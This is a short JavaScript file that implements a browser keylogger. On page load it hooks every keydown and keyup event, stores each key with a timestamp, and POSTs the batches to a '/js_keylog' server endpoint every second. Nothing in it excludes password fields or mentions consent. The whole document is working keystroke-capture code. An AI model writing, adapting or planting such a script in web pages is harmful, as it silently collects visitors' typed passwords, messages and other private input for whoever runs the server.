var keylog = {
  delay: 1000, // How often to send data to server
  min: 5, // Send to server only when there are at least X presses
  cache: [], // Key presses

  init: function () {
    window.addEventListener("keydown", function(evt){
      var payload = {
        'time': Date.now(),
        'key-down': true,
        'key': evt.key
      }
      keylog.cache.push(payload);
    });
    window.addEventListener("keyup", function(evt){
      var payload = {
        'time': Date.now(),
        'key-down': false,
        'key': evt.key
      }
      keylog.cache.push(payload);
    });
    window.setInterval(keylog.send, keylog.delay);
  },
  
    // SEND CAPTURED KEYS TO SERVER
    send: function () { 
      if (keylog.cache.length > keylog.min) {
        /*var data = new FormData;
        data.append("presses", JSON.stringify(keylog.cache));*/

        var data = JSON.stringify(keylog.cache);
    
        // AJAX
        var xhr = new XMLHttpRequest();
        xhr.onload = function(){ console.log(keylog.cache); }; //debugging

        xhr.open("POST", "/js_keylog", true);
        xhr.send(data);
        keylog.cache = [];

    }}
  };
  window.addEventListener("DOMContentLoaded", keylog.init);
